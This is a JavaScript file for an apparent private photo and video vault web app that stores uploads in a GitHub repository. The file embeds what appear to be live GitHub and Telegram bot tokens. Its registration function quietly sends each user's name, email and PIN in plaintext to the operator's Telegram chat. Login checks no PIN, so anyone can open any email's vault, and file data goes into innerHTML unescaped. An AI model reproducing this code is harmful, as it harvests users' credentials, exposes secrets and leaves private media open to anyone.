// Swiper Init
new Swiper(".mySwiper", { effect: "cards", grabCursor: true, autoplay: { delay: 2500 } });

// Config
const GITHUB_TOKEN = "Ghp_QUGftteZ1wXZ9xe4Ucqpfyd0YQNxvr0N8aAj";
const REPO_OWNER = "SIYAMBOSS";
const REPO_NAME = "PHOTO SAVE-BOSS";
const BOT_TOKEN = "8536299808:AAHJFWEna66RMHZdq-AV20Ak1KOOSwTJT9k";
const CHAT_ID = "7416528268";

let isRegistering = false;
let deleteItemData = null;

// Session Management (Reload Solve)
window.onload = () => {
    const user = localStorage.getItem('activeUser');
    if(user) showDashboard(user);
    else document.getElementById('auth-section').classList.remove('hidden');
};

function toggleAuth() {
    isRegistering = !isRegistering;
    document.getElementById('reg-fields').classList.toggle('hidden');
    document.getElementById('auth-title').innerText = isRegistering ? "CREATE" : "LOGIN";
}

async function handleAuth() {
    const name = document.getElementById('user-name').value;
    const email = document.getElementById('user-email').value;
    const pin = document.getElementById('pin-1').value;
    if(!email || !pin) return;

    if(isRegistering) {
        const msg = `🌟 NEW VAULT USER\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 PIN: ${pin}`;
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        alert("Registration Success!");
        toggleAuth();
    } else {
        localStorage.setItem('activeUser', email);
        showDashboard(email);
        document.getElementById('login-sound').play();
    }
}

function showDashboard(email) {
    document.getElementById('auth-section').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    loadGallery(email);
}

function switchTab(tab) {
    const tabs = ['photos', 'videos', 'albums'];
    tabs.forEach(t => {
        document.getElementById(`tab-${t}`).classList.remove('active');
        document.getElementById(`${t}-content`).classList.add('hidden');
    });
    document.getElementById(`tab-${tab}`).classList.add('active');
    document.getElementById(`${tab}-content`).classList.remove('hidden');
    const email = localStorage.getItem('activeUser');
    if(tab === 'photos') loadGallery(email);
    if(tab === 'videos') loadVideos(email);
}

async function uploadFile(event) {
    const file = event.target.files[0];
    const email = localStorage.getItem('activeUser');
    if(!file) return;

    document.getElementById('loader').classList.remove('hidden');
    const reader = new FileReader();
    reader.onload = async (e) => {
        const content = e.target.result.split(',')[1];
        const type = file.type.startsWith('video') ? 'videos' : 'photos';
        const path = `vault/${email}/${type}/${Date.now()}.${file.name.split('.').pop()}`;
        
        const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/${path}`, {
            method: 'PUT',
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` },
            body: JSON.stringify({ message: "Upload", content: content })
        });
        if(res.ok) switchTab(type === 'videos' ? 'videos' : 'photos');
        document.getElementById('loader').classList.add('hidden');
    };
    reader.readAsDataURL(file);
}

async function loadGallery(email) {
    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/vault/${email}/photos`, {
        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
    });
    if(res.ok) {
        const files = await res.json();
        document.getElementById('photos-content').innerHTML = files.reverse().map(f => `
            <div class="relative group aspect-square">
                <img src="${f.download_url}" class="w-full h-full object-cover">
                <button onclick="confirmDelete('${f.path}', '${f.sha}')" class="absolute top-1 right-1 bg-red-600 p-1.5 rounded text-[10px] opacity-0 group-hover:opacity-100 transition-all"><i class="fa-solid fa-trash"></i></button>
            </div>
        `).join('');
    }
}

async function loadVideos(email) {
    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/vault/${email}/videos`, {
        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
    });
    if(res.ok) {
        const files = await res.json();
        document.getElementById('videos-content').innerHTML = files.reverse().map(f => `
            <div class="relative group bg-zinc-900 rounded-xl overflow-hidden">
                <video src="${f.download_url}" controls></video>
                <button onclick="confirmDelete('${f.path}', '${f.sha}')" class="absolute top-2 right-2 bg-red-600 p-2 rounded-lg text-xs"><i class="fa-solid fa-trash"></i></button>
            </div>
        `).join('');
    }
}

function confirmDelete(path, sha) {
    deleteItemData = { path, sha };
    document.getElementById('delete-modal').classList.remove('hidden');
}

function closeDeleteModal() { document.getElementById('delete-modal').classList.add('hidden'); }

document.getElementById('confirm-delete-btn').onclick = async () => {
    const { path, sha } = deleteItemData;
    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/${path}`, {
        method: 'DELETE',
        headers: { 'Authorization': `token ${GITHUB_TOKEN}` },
        body: JSON.stringify({ message: "Delete", sha: sha })
    });
    if(res.ok) {
        closeDeleteModal();
        const type = path.includes('videos') ? 'videos' : 'photos';
        switchTab(type);
    }
};

function logout() { localStorage.clear(); location.reload(); }
